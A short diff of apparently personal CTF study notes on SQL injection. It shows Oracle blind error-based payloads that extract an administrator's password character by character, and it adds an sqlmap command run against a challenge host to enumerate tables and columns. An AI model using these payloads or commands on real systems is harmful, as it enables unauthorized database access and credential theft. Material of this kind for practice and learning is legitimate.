@@ -35,4 +35,9 @@ SQL injection notes:
                 'AND (SELECT CASE WHEN LENGTH(password) >20 THEN TO_CHAR(1/0) ELSE 'A' END FROM users WHERE username='administrator') = 'A'--
                 'AND (SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE 'A' END FROM users WHERE username='administrator') = 'A'--
 
+
+SQL MAP:
+sqlmap -u "http://chal4.hackademy.ctf/" --data="username=admin&password=pwd" --method POST --level=3 --risk=3 --tables --columns 
+
+
    
